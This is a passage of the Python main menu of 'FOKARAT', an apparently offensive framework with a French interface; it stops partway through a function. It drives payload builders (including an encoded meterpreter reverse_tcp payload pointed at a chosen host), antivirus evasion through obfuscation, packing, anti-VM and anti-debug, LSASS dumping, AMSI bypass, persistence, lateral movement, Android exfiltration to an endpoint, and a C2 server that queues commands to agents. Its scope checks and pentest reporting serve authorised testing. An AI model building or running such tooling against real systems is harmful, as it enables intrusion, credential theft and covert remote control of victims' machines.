#!/usr/bin/env python3
"""
FOKARAT v4.0 - Framework de cybersécurité
Sprint 11 : Rapports PDF professionnels (Executive Summary + CVSS + Recommandations)
"""
import os
import sys
import time
import json
import base64

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.config import Config
from core.logger import Logger
from core.utils import which
from core.database import Database
from core.scope import ScopeValidator
from core.ethics import EthicsController
from core.plugin_loader import PluginLoader
from core.mitre import MitreMapper
from core.crypto import CryptoManager
from core.sandbox import Sandbox
from sdk.plugin_base import ScopeError

from modules.payload_generators.python_gen import PythonPayloadGenerator
from modules.payload_generators.cpp_gen import CppPayloadGenerator
from modules.payload_generators.msfvenom_gen import MsfvenomGenerator
from modules.listeners.listener_manager import ListenerManager
from modules.injectors.badusb_gen import BadUSBGenerator
from modules.injectors.duck_encoder import DuckEncoder
from modules.injectors.usb_flasher import USBFlasher
from modules.injectors.http_server import HTTPServer
from modules.android.apk_injector import ApkInjector
from modules.persistence.wmi_persist import WMIPersistence
from modules.evasion.payload_padding import PaddingGenerator
from modules.evasion.python_obfuscator import PythonObfuscator
from modules.evasion.upx_packer import UPXPacker
from modules.evasion.multi_encoder import MultiEncoder
from modules.evasion.anti_vm import AntiVMGenerator
from modules.evasion.anti_debug import AntiDebugGenerator

# Sprint 7
from modules.post_exploitation.windows.enumeration import WindowsEnumeration
from modules.post_exploitation.windows.lsass_dump import LSASSDump
from modules.post_exploitation.windows.persistence import WindowsPersistence
from modules.post_exploitation.windows.amsi_bypass import AMSIBypass
from modules.post_exploitation.windows.lateral_movement import LateralMovement

# Sprint 8
from modules.post_exploitation.linux.enumeration import LinuxEnumeration
from modules.post_exploitation.linux.privesc import LinuxPrivesc
from modules.post_exploitation.linux.persistence import LinuxPersistence
from modules.post_exploitation.linux.credentials import LinuxCredentials
from modules.post_exploitation.linux.lateral import LinuxLateral

# Sprint 9
from modules.c2.http_c2_server import C2HTTPServer
from modules.c2.http_c2_agent import HTTPC2Agent
from modules.c2.pivoting import Pivoting
from modules.c2.session_manager import session_manager
from modules.c2.crypto_channel import C2Crypto

# Sprint 10
from modules.post_exploitation.android.enumeration import AndroidEnumeration
from modules.post_exploitation.android.persistence import AndroidPersistence
from modules.post_exploitation.android.credentials import AndroidCredentials
from modules.post_exploitation.android.privesc import AndroidPrivesc
from modules.post_exploitation.android.exfiltration import AndroidExfiltration
from modules.post_exploitation.ios.enumeration import IOSEnumeration
from modules.post_exploitation.ios.jailbreak import IOSJailbreak
from modules.post_exploitation.ios.persistence import IOSPersistence
from modules.post_exploitation.ios.credentials import IOSCredentials

# Sprint 11
from modules.reporting.pdf_generator import PDFReportGenerator, ExecutiveReport
from modules.reporting.findings import findings_manager, Finding
from modules.reporting.cvss import CVSS31, list_presets, from_preset


logger = Logger()
config = Config()
listener = ListenerManager()
http_server = HTTPServer()
db = Database()
scope_validator = ScopeValidator()
ethics = EthicsController()
plugin_loader = PluginLoader()
mitre = MitreMapper()
crypto = CryptoManager()
sandbox = Sandbox()

c2_server = None


class C:
    R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"
    WHT = "\033[97m"; PNK = "\033[38;5;213m"; OR = "\033[38;5;208m"


BANNER = f"""{C.GRN}{C.B}
   ███████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ████████╗
   ██╔════╝██╔═══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
   █████╗  ██║   ██║█████╔╝ ███████║██████╔╝███████║   ██║
   ██╔══╝  ██║   ██║██╔═██╗ ██╔══██║██╔══██╗██╔══██║   ██║
   ██║     ╚██████╔╝██║  ██╗██║  ██║██║  ██║██║  ██║   ██║
   ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   {C.R}
{C.CYN}{C.B}              Building the future, one tool at a time.{C.R}
{C.YEL}                    FOKARAT Framework v4.0{C.R}
"""


BOOT_SEQUENCE = [
    ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.04),
    ("[BOOT 02] Chargement des payloads...", 0.04),
    ("[BOOT 03] Chargement des listeners...", 0.04),
    ("[BOOT 04] Chargement des modules Android...", 0.04),
    ("[BOOT 05] Chargement des modules d'évasion...", 0.04),
    ("[BOOT 06] Chargement post-exploitation Windows...", 0.04),
    ("[BOOT 07] Chargement post-exploitation Linux...", 0.04),
    ("[BOOT 08] Chargement post-exploitation Mobile...", 0.04),
    ("[BOOT 09] Chargement des modules C2...", 0.04),
    ("[BOOT 10] Chargement du module reporting...", 0.04),
    ("[BOOT 11] Initialisation de la base de données...", 0.04),
    ("[BOOT 12] Chargement du contrôleur éthique...", 0.04),
    ("[BOOT 13] Validation du scope...", 0.04),
    ("[BOOT 14] Chargement des plugins...", 0.04),
    ("[BOOT 15] Chargement du mapper MITRE...", 0.04),
    ("[BOOT 16] Initialisation crypto + sandbox...", 0.04),
    ("[BOOT 17] Vérification des dépendances...", 0.10),
    ("[BOOT 18] Système prêt.", 0.15),
]


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def typewriter(text, delay=0.008, color=C.WHT):
    for char in text:
        sys.stdout.write(f"{color}{char}{C.R}")
        sys.stdout.flush()
        time.sleep(delay)
    print()


def spinner(duration=0.6, message="Chargement", color=C.CYN):
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r  {color}{frames[i % len(frames)]}{C.R} {message}...")
        sys.stdout.flush()
        time.sleep(0.06)
        i += 1
    sys.stdout.write("\r" + " " * (len(message) + 15) + "\r")


def progress_bar(duration=0.6, width=40, color=C.GRN):
    sys.stdout.write("  ")
    for i in range(width + 1):
        pct = int(i / width * 100)
        sys.stdout.write(f"\r  {color}{'█' * i}{C.D}{'░' * (width - i)}{C.R} {C.B}{pct:3d}%{C.R}")
        sys.stdout.flush()
        time.sleep(duration / width)
    print()


def boot_animation():
    clear()
    print()
    for msg, delay in BOOT_SEQUENCE:
        typewriter(f"  {C.YEL}{msg}{C.R}", delay=0.003)
        time.sleep(delay)
    print()
    progress_bar(0.6, 50, C.CYN)
    time.sleep(0.2)


def animated_banner():
    clear()
    print()
    for line in BANNER.split("\n"):
        print(f"  {line}")
        time.sleep(0.012)
    print()


def separator(char="═", length=62, color=C.CYN):
    return f"{color}{char * length}{C.R}"


def menu_option(key, label, color=C.WHT):
    return f"  {C.YEL}│{C.R}  {C.GRN}[{key}]{C.R}  {color}{label}{C.R}"


def show_menu():
    clear()
    animated_banner()

    lhost = config.get("lhost") or f"{C.RED}(non défini){C.R}"
    lport = config.get("lport")
    scope_status = f"{C.GRN}✓{C.R}" if scope_validator.active_scope else f"{C.RED}✗{C.R}"
    dry_status = f"{C.YEL}ON{C.R}" if ethics.dry_run else f"{C.D}OFF{C.R}"
    plugins_count = len(plugin_loader.plugins)
    sessions_count = len(session_manager.sessions)
    findings_count = len(findings_manager.findings)

    print(f"  {C.MAG}◆{C.R} LHOST:{C.CYN}{lhost}{C.R}  "
          f"{C.MAG}◆{C.R} LPORT:{C.CYN}{lport}{C.R}  "
          f"{C.MAG}◆{C.R} Scope:{scope_status}  "
          f"{C.MAG}◆{C.R} DRY:{dry_status}  "
          f"{C.MAG}◆{C.R} Plugins:{C.CYN}{plugins_count}{C.R}  "
          f"{C.MAG}◆{C.R} Sessions:{C.CYN}{sessions_count}{C.R}  "
          f"{C.MAG}◆{C.R} Findings:{C.CYN}{findings_count}{C.R}")
    print()
    print(separator("═", 62, C.CYN))

    print(f"  {C.B}{C.MAG}▶ PAYLOADS{C.R}")
    print(menu_option("01", "Payload Python"))
    print(menu_option("02", "Payload C++ (Mingw)"))
    print(menu_option("03", "Payload MSFVenom"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.MAG}▶ LISTENERS / BADUSB{C.R}")
    print(menu_option("04", "Listener ncat"))
    print(menu_option("05", "Listener Metasploit"))
    print(menu_option("06", "Arrêter les listeners", C.RED))
    print(menu_option("07", "Serveur HTTP"))
    print(menu_option("08", "DuckyScript"))
    print(menu_option("09", "Encoder .duck → .bin"))
    print(menu_option("10", "Flasher USB"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.RED}▶ ÉVASION{C.R}")
    print(menu_option("20", "Padding C++"))
    print(menu_option("21", "Obfuscation Python"))
    print(menu_option("22", "Compression UPX"))
    print(menu_option("23", "Multi-encodage"))
    print(menu_option("24", "Anti-VM"))
    print(menu_option("25", "Anti-Debug"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.OR}▶ POST-EXPLOITATION WINDOWS{C.R}")
    print(menu_option("60", "Énumération"))
    print(menu_option("61", "LSASS dump"))
    print(menu_option("62", "Persistance (7 tech)"))
    print(menu_option("63", "AMSI Bypass"))
    print(menu_option("64", "Mouvement latéral"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.OR}▶ POST-EXPLOITATION LINUX{C.R}")
    print(menu_option("70", "Énumération"))
    print(menu_option("71", "Privesc (10 tech)"))
    print(menu_option("72", "Persistance (6 tech)"))
    print(menu_option("73", "Credentials"))
    print(menu_option("74", "Mouvement latéral"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.MAG}▶ C2 (COMMAND & CONTROL){C.R}")
    print(menu_option("80", "Démarrer serveur C2 HTTP(S)"))
    print(menu_option("81", "Générer agent C2"))
    print(menu_option("82", "Pivoting / Tunneling"))
    print(menu_option("83", "Voir les sessions"))
    print(menu_option("84", "Envoyer commande"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.PNK}▶ POST-EXPLOITATION MOBILE{C.R}")
    print(menu_option("90", "Android : Énumération"))
    print(menu_option("91", "Android : Persistance"))
    print(menu_option("92", "Android : Credentials"))
    print(menu_option("93", "Android : Privesc"))
    print(menu_option("94", "Android : Exfiltration"))
    print(menu_option("95", "iOS : Énumération"))
    print(menu_option("96", "iOS : Jailbreak check"))
    print(menu_option("97", "iOS : Persistance"))
    print(menu_option("98", "iOS : Credentials"))
    print(menu_option("99", "iOS : Guide jailbreak"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.GRN}▶ RAPPORTS PROFESSIONNELS{C.R}")
    print(menu_option("100", "Ajouter un finding (vulnérabilité)"))
    print(menu_option("101", "Lister les findings"))
    print(menu_option("102", "Générer rapport PDF complet"))
    print(menu_option("103", "Générer Executive Summary (Markdown)"))
    print(menu_option("104", "Voir les presets CVSS"))
    print(menu_option("105", "Supprimer un finding"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.PNK}▶ PLUGINS / DIVERS{C.R}")
    print(menu_option("40", f"Lister les plugins ({plugins_count})"))
    print(menu_option("41", "Exécuter un plugin"))
    print(menu_option("42", "Recharger les plugins"))
    print(menu_option("26", "Rapport d'opérations (legacy)"))
    print(menu_option("33", "Rapport MITRE ATT&CK"))
    print(menu_option("34", "Export MITRE Navigator"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.YEL}▶ SÉCURITÉ{C.R}")
    print(menu_option("50", "Chiffrer fichier AES-256"))
    print(menu_option("51", "Déchiffrer fichier"))
    print(menu_option("52", "Tester sandbox"))
    print(menu_option("53", "Token JWT API"))
    print(menu_option("54", "Ajouter webhook SIEM"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.RED}▶ ÉTHIQUE & LÉGAL{C.R}")
    print(menu_option("30", "Déclarer un scope"))
    print(menu_option("31", "Activer/Désactiver DRY-RUN"))
    print(menu_option("32", "Journal d'audit"))

    print(separator("─", 62, C.BLU))
    print(f"  {C.B}{C.MAG}▶ DIVERS{C.R}")
    print(menu_option("14", "Configuration LHOST/LPORT"))
    print(menu_option("15", "Sauvegarder config"))
    print(menu_option("16", "Ouvrir msfconsole"))
    print(menu_option("17", "Vérifier dépendances"))
    print(menu_option("27", "Lancer API Web"))
    print(menu_option("18", "Crédits"))
    print(menu_option("19", "Quitter", C.RED))

    print(separator("═", 62, C.CYN))
    print()


def check_dependencies():
    clear()
    animated_banner()
    print(f"  {C.B}{C.CYN}═══ DÉPENDANCES ═══{C.R}\n")
    deps = {
        "python3": "Python", "pip": "pip", "git": "Git",
        "g++": "C++", "x86_64-w64-mingw32-g++": "Mingw64",
        "msfvenom": "MSFVenom", "msfconsole": "MSFConsole",
        "ncat": "ncat", "apktool": "APKTool", "jarsigner": "Jarsigner",
        "upx": "UPX", "pyinstaller": "PyInstaller",
        "adb": "ADB (S10)", "frida": "Frida (S10)",
        "impacket-psexec": "Impacket (S7)",
        "pypykatz": "Pypykatz (S7)",
    }
    missing = []
    for cmd, desc in deps.items():
        if which(cmd):
            print(f"  {C.GRN}[✓]{C.R} {C.B}{cmd:<26}{C.R} {C.D}{desc}{C.R}")
        else:
            print(f"  {C.RED}[✗]{C.R} {C.B}{cmd:<26}{C.R} {C.D}{desc}{C.R}")
            missing.append(cmd)

    print()
    # Vérifie reportlab (Sprint 11)
    try:
        import reportlab
        print(f"  {C.GRN}[✓]{C.R} {C.B}{'reportlab':<26}{C.R} {C.D}PDF (S11){C.R}")
    except ImportError:
        print(f"  {C.RED}[✗]{C.R} {C.B}{'reportlab':<26}{C.R} {C.D}PDF (S11) - pip install reportlab{C.R}")
        missing.append("reportlab")

    print()
    if missing:
        logger.warning(f"{len(missing)} outil(s) manquant(s).")
    else:
        logger.success("Toutes les dépendances présentes.")
    input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")


def _ask_target_and_confirm(name):
    target = input(f"  {C.YEL}Cible :{C.R} ").strip()
    if not target:
        logger.error("Cible obligatoire."); return None
    if not scope_validator.active_scope:
        logger.error("Aucun scope actif. Lance [30] d'abord."); return None
    if scope_validator.active_scope["target"] != target:
        logger.error(f"Cible '{target}' hors scope."); return None
    if not ethics.confirm_action(f"{name} sur {target}"):
        return None
    return target


# ─── Sprint 7-10 : gestionnaires (inchangés) ──────────
def handle_enum_windows():
    t = _ask_target_and_confirm("Énumération Windows")
    if not t: return
    mode = input(f"  Mode (generate/local) [generate] : ").strip() or "generate"
    logger.success(f"Résultat : {WindowsEnumeration().run(config, args={'target': t, 'mode': mode})}")


def handle_lsass_dump():
    t = _ask_target_and_confirm("LSASS Dump")
    if not t: return
    m = input(f"  Méthode [comsvcs] : ").strip() or "comsvcs"
    logger.success(f"Résultat : {LSASSDump().run(config, args={'target': t, 'method': m})}")


def handle_persistence_win():
    t = _ask_target_and_confirm("Persistance Windows")
    if not t: return
    tech = input(f"  Tech [registry_run] : ").strip() or "registry_run"
    payload = input(f"  Payload [C:\\Windows\\Temp\\p.exe] : ").strip() or "C:\\Windows\\Temp\\p.exe"
    logger.success(f"Résultat : {WindowsPersistence().run(config, args={'target': t, 'technique': tech, 'payload': payload})}")


def handle_amsi_bypass():
    t = _ask_target_and_confirm("AMSI Bypass")
    if not t: return
    tech = input(f"  Tech [reflection] : ").strip() or "reflection"
    logger.success(f"Résultat : {AMSIBypass().run(config, args={'target': t, 'technique': tech})}")


def handle_lateral_win():
    t = _ask_target_and_confirm("Mouvement latéral Windows")
    if not t: return
    m = input(f"  Méthode [wmiexec] : ").strip() or "wmiexec"
    u = input(f"  User [Administrator] : ").strip() or "Administrator"
    d = input(f"  Domain [.] : ").strip() or "."
    p = input(f"  Password : ").strip()
    nth = input(f"  NTLM : ").strip()
    logger.success(f"Résultat : {LateralMovement().run(config, args={'target': t, 'method': m, 'username': u, 'password': p, 'domain': d, 'nthash': nth})}")


def handle_enum_linux():
    t = _ask_target_and_confirm("Énumération Linux")
    if not t: return
    mode = input(f"  Mode [generate] : ").strip() or "generate"
    logger.success(f"Résultat : {LinuxEnumeration().run(config, args={'target': t, 'mode': mode})}")


def handle_privesc_linux():
    t = _ask_target_and_confirm("Privesc Linux")
    if not t: return
    tech = input(f"  Tech [all] : ").strip() or "all"
    logger.success(f"Résultat : {LinuxPrivesc().run(config, args={'target': t, 'technique': tech})}")


def handle_persistence_linux():
    t = _ask_target_and_confirm("Persistance Linux")
    if not t: return
    tech = input(f"  Tech [cron] : ").strip() or "cron"
    payload = input(f"  Payload [/tmp/p.sh] : ").strip() or "/tmp/p.sh"
    logger.success(f"Résultat : {LinuxPersistence().run(config, args={'target': t, 'technique': tech, 'payload': payload})}")


def handle_credentials_linux():
    t = _ask_target_and_confirm("Credentials Linux")
    if not t: return
    cat = input(f"  Cat [all] : ").strip() or "all"
    logger.success(f"Résultat : {LinuxCredentials().run(config, args={'target': t, 'category': cat})}")


def handle_lateral_linux():
    t = _ask_target_and_confirm("Mouvement latéral Linux")
    if not t: return
    m = input(f"  Méthode [ssh] : ").strip() or "ssh"
    u = input(f"  User [root] : ").strip() or "root"
    logger.success(f"Résultat : {LinuxLateral().run(config, args={'target': t, 'method': m, 'username': u})}")


def handle_c2_start():
    global c2_server
    if c2_server and c2_server.running:
        logger.info("Serveur C2 déjà actif."); return
    port = input(f"  Port [8443] : ").strip() or "8443"
    try: port = int(port)
    except: port = 8443
    c2_server = C2HTTPServer(host="0.0.0.0", port=port)
    try:
        c2_server.start()
        sk = base64.b64encode(c2_server.session_key).decode()
        print(f"\n  {C.GRN}Session key : {C.CYN}{sk}{C.R}\n")
    except OSError as e:
        logger.error(f"Erreur : {e}")


def handle_c2_agent():
    global c2_server
    if not c2_server or not c2_server.running:
        logger.error("Démarre [80] d'abord."); return
    sk = base64.b64encode(c2_server.session_key).decode()
    t = _ask_target_and_confirm("Agent C2")
    if not t: return
    at = input(f"  Type [python] : ").strip() or "python"
    lhost = input(f"  LHOST [{config.get('lhost')}] : ").strip() or config.get("lhost")
    logger.success(f"Résultat : {HTTPC2Agent().run(config, args={'target': t, 'lhost': lhost, 'lport': c2_server.port, 'session_key': sk, 'agent_type': at})}")


def handle_c2_pivot():
    t = _ask_target_and_confirm("Pivoting")
    if not t: return
    m = input(f"  Méthode [ssh_socks] : ").strip() or "ssh_socks"
    logger.success(f"Résultat : {Pivoting().run(config, args={'target': t, 'method': m})}")


def handle_c2_sessions():
    clear()
    print(f"\n  {C.B}{C.MAG}═══ SESSIONS C2 ═══{C.R}\n")
    sessions = session_manager.list_sessions()
    if not sessions:
        logger.info("Aucune session."); return
    for s in sessions:
        alive = f"{C.GRN}●{C.R}" if s['alive'] else f"{C.RED}○{C.R}"
        print(f"  {alive} {C.CYN}{s['id']:<15}{C.R} {s['hostname']:<18} {s['username']}")


def handle_c2_send_command():
    sessions = session_manager.list_sessions()
    if not sessions:
        logger.error("Aucune session."); return
    for i, s in enumerate(sessions, 1): print(f"    [{i}] {s['id']} - {s['hostname']}")
    try:
        c = int(input(f"  Session : ").strip())
        s = sessions[c - 1]
    except (ValueError, IndexError):
        logger.error("Invalide."); return
    cmd = input(f"  Commande : ").strip()
    if cmd and c2_server:
        c2_server.queue_command(s["id"], cmd)
        logger.success(f"Envoyé : {cmd}")


def handle_android_enum():
    t = _ask_target_and_confirm("Énumération Android")
    if not t: return
    logger.success(f"Résultat : {AndroidEnumeration().run(config, args={'target': t})}")


def handle_android_persistence():
    t = _ask_target_and_confirm("Persistance Android")
    if not t: return
    tech = input(f"  Tech [boot_receiver] : ").strip() or "boot_receiver"
    logger.success(f"Résultat : {AndroidPersistence().run(config, args={'target': t, 'technique': tech})}")


def handle_android_credentials():
    t = _ask_target_and_confirm("Credentials Android")
    if not t: return
    cat = input(f"  Cat [all] : ").strip() or "all"
    logger.success(f"Résultat : {AndroidCredentials().run(config, args={'target': t, 'category': cat})}")


def handle_android_privesc():
    t = _ask_target_and_confirm("Privesc Android")
    if not t: return
    tech = input(f"  Tech [root_check] : ").strip() or "root_check"
    logger.success(f"Résultat : {AndroidPrivesc().run(config, args={'target': t, 'technique': tech})}")


def handle_android_exfil():
    t = _ask_target_and_confirm("Exfiltration Android")
    if not t: return
    m = input(f"  Méthode [http] : ").strip() or "http"
    ep = input(f"  Endpoint : ").strip()
    fp = input(f"  Fichier [/sdcard/data.zip] : ").strip() or "/sdcard/data.zip"
    logger.success(f"Résultat : {AndroidExfiltration().run(config, args={'target': t, 'method': m, 'endpoint': ep, 'file': fp})}")


def handle_ios_enum():
    t = _ask_target_and_confirm("Énumération iOS")
    if not t: return
    logger.success(f"Résultat : {IOSEnumeration().run(config, args={'target': t})}")


def handle_ios_jailbreak_check():
    t = _ask_target_and_confirm("Jailbreak iOS")
    if not t: return
    a = input(f"  Action (check/guide) [check] : ").strip() or "check"
    result = IOSJailbreak().run(config, args={'target': t, 'action': a})
    if a == "guide":
        for k, v in result.get("jailbreaks", {}).items():
            print(f"    [{k}] {v['name']} — {v['versions']} ({v['hardware']})")
    else:
        logger.success(f"Résultat : {result}")


def handle_ios_persistence():
    t = _ask_target_and_confirm("Persistance iOS")
    if not t: return
    tech = input(f"  Tech [launchdaemon] : ").strip() or "launchdaemon"
    payload = input(f"  Payload [/var/mobile/p] : ").strip() or "/var/mobile/p"
    logger.success(f"Résultat : {IOSPersistence().run(config, args={'target': t, 'technique': tech, 'payload': payload})}")


def handle_ios_credentials():
    t = _ask_target_and_confirm("Credentials iOS")
    if not t: return
    cat = input(f"  Cat [all] : ").strip() or "all"
    logger.success(f"Résultat : {IOSCredentials().run(config, args={'target': t, 'category': cat})}")


def handle_ios_jailbreak_guide():
    t = _ask_target_and_confirm("Guide jailbreak iOS")
    if not t: return
    result = IOSJailbreak().run(config, args={'target': t, 'action': 'guide'})
    print(f"\n  {C.B}{C.PNK}Guide Jailbreak iOS{C.R}\n")
    for k, v in result.get("jailbreaks", {}).items():
        print(f"  {C.CYN}[{k}]{C.R} {C.B}{v['name']}{C.R}")
        print(f"      Versions : {v['versions']}")
        print(f"      Matériel : {v['hardware']}")
        print(f"      Méthode  : {v['method']}\n")


# ─── Sprint 11 : Reporting ────────────────────────────
def handle_add_finding():
    clear()
    print(f"\n  {C.B}{C.GRN}═══ AJOUTER UN FINDING ═══{C.R}\n")

    title = input(f"  {C.YEL}Titre :{C.R} ").strip()
    if not title:
        logger.error("Titre obligatoire."); return

    target = input(f"  {C.YEL}Cible :{C.R} ").strip()
    category = input(f"  {C.YEL}Catégorie (web/network/mobile/...) [generic] :{C.R} ").strip() or "generic"

    print(f"\n  {C.YEL}Presets CVSS disponibles :{C.R}")
    presets = list_presets()
    for i, p in enumerate(presets, 1):
        print(f"    [{i}] {p['id']:<24} CVSS {p['score']:<4} ({p['severity']})")
    print(f"    [0] Saisie manuelle")

    choice = input(f"\n  {C.YEL}Choix du preset [1] :{C.R} ").strip() or "1"

    cvss_preset = None
    cvss_custom = None
    severity = None

    if choice == "0":
        print(f"\n  {C.YEL}Métriques CVSS v3.1 :{C.R}")
        av = input(f"  AV (N/A/L/P) [N] : ").strip().upper() or "N"
        ac = input(f"  AC (L/H) [L] : ").strip().upper() or "L"
        pr = input(f"  PR (N/L/H) [N] : ").strip().upper() or "N"
        ui = input(f"  UI (N/R) [N] : ").strip().upper() or "N"
        s = input(f"  Scope (U/C) [U] : ").strip().upper() or "U"
        c = input(f"  C (N/L/H) [H] : ").strip().upper() or "H"
        i_ = input(f"  I (N/L/H) [H] : ").strip().upper() or "H"
        a = input(f"  A (N/L/H) [H] : ").strip().upper() or "H"
        cvss_custom = {"av": av, "ac": ac, "pr": pr, "ui": ui, "s": s, "c": c, "i": i_, "a": a}
    else:
        try:
            idx = int(choice) - 1
            cvss_preset = presets[idx]["id"]
        except (ValueError, IndexError):
            cvss_preset = "misconfig"

    description = input(f"\n  {C.YEL}Description :{C.R} ").strip()
    evidence = input(f"  {C.YEL}Preuve (extrait) :{C.R} ").strip()
    remediation = input(f"  {C.YEL}Recommandation :{C.R} ").strip()
    mitre = input(f"  {C.YEL}Technique MITRE [optionnel] :{C.R} ").strip() or None

    finding = Finding(
        title=title,
        description=description,
        evidence=evidence,
        remediation=remediation,
        mitre_technique=mitre,
        target=target,
        category=category,
        cvss_preset=cvss_preset,
        cvss_custom=cvss_custom,
        severity=severity,
    )
    findings_manager.add(finding)

    print(f"\n  {C.GRN}Finding ajouté :{C.R}")
    print(f"    ID       : {finding.id}")
    print(f"    Sévérité : {finding.severity}")
    print(f"    Score    : {finding.score}/10")
    print(f"    Vecteur  : {finding.cvss.vector()}\n")
    ethics.audit("FINDING_ADDED", f"{finding.id}: {title}")


def handle_list_findings():
    clear()
    print(f"\n  {C.B}{C.GRN}═══ FINDINGS ═══{C.R}\n")
    findings = findings_manager.list_all()
    if not findings:
        logger.info("Aucun finding enregistré."); return

    stats = findings_manager.stats()
    print(f"  {C.D}Total : {stats['total']} | CVSS moyen : {stats['average_score']}{C.R}")
    print(f"  {C.RED}Critical : {stats['critical']}{C.R} | "
          f"{C.OR}High : {stats['high']}{C.R} | "
          f"{C.YEL}Medium : {stats['medium']}{C.R} | "
          f"{C.GRN}Low : {stats['low']}{C.R}\n")

    # Trié par score
    sorted_findings = sorted(findings, key=lambda x: x["score"], reverse=True)
    for f in sorted_findings:
        sev_color = {
            "CRITICAL": C.RED, "HIGH": C.OR, "MEDIUM": C.YEL,
            "LOW": C.GRN, "NONE": C.D,
        }.get(f["severity"], C.WHT)
        print(f"  {sev_color}[{f['severity']:<8}]{C.R} "
              f"{C.CYN}{f['id']}{C.R}  CVSS {f['score']:<4}  "
              f"{C.B}{f['title']}{C.R}")
        print(f"             Cible : {f['target'] or 'N/A'}  |  Catégorie : {f['category']}\n")


def handle_generate_pdf():
    clear()
    print(f"\n  {C.B}{C.GRN}═══ GÉNÉRER RAPPORT PDF ═══{C.R}\n")

    if not findings_manager.findings:
        logger.warning("Aucun finding. Ajoute-en d'abord avec [100].")
        return

    client = input(f"  {C.YEL}Nom du client [Client] :{C.R} ").strip() or "Client"
    assessor = input(f"  {C.YEL}Auditeur [FOKAS] :{C.R} ").strip() or "FOKAS"
    scope = input(f"  {C.YEL}Scope [{scope_validator.active_scope['target'] if scope_validator.active_scope else 'N/A'}] :{C.R} ").strip()

    if not scope and scope_validator.active_scope:
        scope = scope_validator.active_scope["target"]

    output = input(f"  {C.YEL}Fichier de sortie [output/fokarat_report.pdf] :{C.R} ").strip() or "output/fokarat_report.pdf"

    spinner(0.5, "Génération du PDF")
    gen = PDFReportGenerator(client_name=client, assessor=assessor, scope=scope)
    path = gen.generate(output_path=output)

    print(f"\n  {C.GRN}Rapport généré : {path}{C.R}\n")
    ethics.audit("PDF_REPORT_GENERATED", path)


def handle_generate_exec_summary():
    clear()
    print(f"\n  {C.B}{C.GRN}═══ EXECUTIVE SUMMARY ═══{C.R}\n")

    if not findings_manager.findings:
        logger.warning("Aucun finding."); return

    client = input(f"  {C.YEL}Nom du client [Client] :{C.R} ").strip() or "Client"
    assessor = input(f"  {C.YEL}Auditeur [FOKAS] :{C.R} ").strip() or "FOKAS"
    output = input(f"  {C.YEL}Sortie [output/executive_summary.md] :{C.R} ").strip() or "output/executive_summary.md"

    spinner(0.3, "Génération")
    path = ExecutiveReport(client_name=client, assessor=assessor).generate_markdown(output)
    print(f"\n  {C.GRN}Executive summary : {path}{C.R}\n")
    ethics.audit("EXEC_SUMMARY_GENERATED", path)


def handle_list_cvss_presets():
    clear()
    print(f"\n  {C.B}{C.GRN}═══ PRESETS CVSS v3.1 ═══{C.R}\n")
    for p in list_presets():
        sev_color = {
            "CRITICAL": C.RED, "HIGH": C.OR, "MEDIUM": C.YEL,
            "LOW": C.GRN, "NONE": C.D,
        }.get(p["severity"], C.WHT)
        print(f"  {C.CYN}{p['id']:<24}{C.R} "
              f"{sev_color}{p['score']:<4} ({p['severity']:<8}){C.R}  "
              f"{C.D}{p['vector']}{C.R}")


def handle_remove_finding():
    findings = findings_manager.list_all()
    if not findings:
        logger.info("Aucun finding."); return

    for i, f in enumerate(findings, 1):
        print(f"    [{i}] {f['id']} — [{f['severity']}] {f['title']}")

    try:
        c = int(input(f"  {C.YEL}Supprimer [#] :{C.R} ").strip())
        finding = findings[c - 1]
    except (ValueError, IndexError):
        logger.error("Invalide."); return

    if findings_manager.remove(finding["id"]):
        logger.success(f"Finding supprimé : {finding['id']}")
        ethics.audit("FINDING_REMOVED", finding["id"])


# ─── Gestionnaires existants ──────────────────────────
def handle_padding():
    path = input(f"  .c : ").strip()
    if path and os.path.exists(path):
        with open(path) as f: code = f.read()
        out = path.replace(".c", "_protected.c")
        with open(out, "w") as f: f.write(PaddingGenerator().wrap_payload(code, 8, 15))
        logger.success(f"Protégé : {out}")


def handle_python_obfuscation():
    path = input(f"  .py : ").strip()
    if path and os.path.exists(path):
        with open(path) as f: code = f.read()
        out = path.replace(".py", "_obf.py")
        with open(out, "w") as f: f.write(PythonObfuscator().obfuscate(code))
        logger.success(f"Obfusqué : {out}")


def handle_upx():
    path = input(f"  Binaire : ").strip()
    if path and os.path.exists(path): UPXPacker().pack(path, True)


def handle_multi_encoder():
    MultiEncoder().list_encoders()
    k = input(f"  Choix [1] : ").strip() or "1"
    lh = input(f"  LHOST : ").strip()
    if not lh: return
    lp = int(input(f"  LPORT : ").strip())
    it = int(input(f"  Iter [5] : ").strip() or "5")
    out = os.path.join(config.get("output_dir", "output"), f"payload_enc_{k}.exe")
    os.makedirs(os.path.dirname(out), exist_ok=True)
    MultiEncoder().encode("windows/meterpreter/reverse_tcp", lh, lp, out, k, it)


def handle_anti_vm():
    path = input(f"  .c : ").strip()
    if path and os.path.exists(path):
        with open(path) as f: code = f.read()
        out = path.replace(".c", "_antivm.c")
        with open(out, "w") as f: f.write(AntiVMGenerator().wrap_with_anti_vm(code))
        logger.success(f"Anti-VM : {out}")


def handle_anti_debug():
    path = input(f"  .c : ").strip()
